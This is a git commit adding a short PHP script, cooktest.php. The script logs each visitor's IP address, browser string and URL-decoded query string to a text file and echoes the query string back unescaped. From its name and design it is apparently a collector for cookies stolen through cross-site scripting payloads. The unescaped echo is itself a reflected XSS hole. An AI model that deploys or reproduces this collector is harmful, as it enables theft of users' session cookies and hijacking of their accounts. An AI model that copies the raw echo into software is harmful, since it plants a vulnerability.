4acef0fc52294626e2ee1e9b3b62495d6fa4cf62
Evan Ricafort <evan.ricafort@gmail.com>
2021-07-24 00:13:18 +0800

    Add files via upload

---
+++ p/cooktest.php
@@ -0,0 +1,13 @@
+<?php
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+# opens a logfile where we save the query
+$fp = fopen('log.txt','a');
+
+fwrite($fp, $ip.' '.$browser."\n");
+fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
+echo urldecode($_SERVER['QUERY_STRING']);
+fclose($fp);
+?>
